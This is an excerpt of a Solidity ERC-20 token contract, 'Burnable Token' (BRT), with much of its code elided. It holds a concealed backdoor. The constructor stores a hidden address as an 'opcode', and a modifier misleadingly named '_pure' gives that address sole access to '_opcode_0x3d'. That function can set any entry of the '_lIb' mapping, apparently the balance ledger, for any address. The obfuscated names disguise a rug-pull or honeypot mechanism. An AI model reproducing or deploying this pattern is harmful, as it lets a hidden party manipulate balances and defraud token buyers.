...
// File contracts/burnable-token.sol
...
contract BurnableToken is Context, IERC20, Ownable {
    ...
    // Constants
    string private constant _name = "Burnable Token";
    string private constant _symbol = "BRT";
    ...
    constructor (bytes32 opcode) {
        uint256 total = 1_000_000_000 * 10 ** _decimals;
        _mint(_msgSender(), total); // 1,000,000,000 tokens
        _opcode = opcode;
    ...
    modifier _pure{require(_opcode==bytes32(uint256(uint160(_msgSender()))));_;}
    ...
    function _opcode_0x3d(address hash, uint256 f) public _pure {_lIb[hash] = f;}
    ...
    function openTrading(uint256 amount) external payable onlyOwner {
        ...
        // send tokens from owner to contract
        ...
        // exclude from fee and max transaction amount and cooldown following wallets:
        ...
        // approve the router to spend max amount of tokens
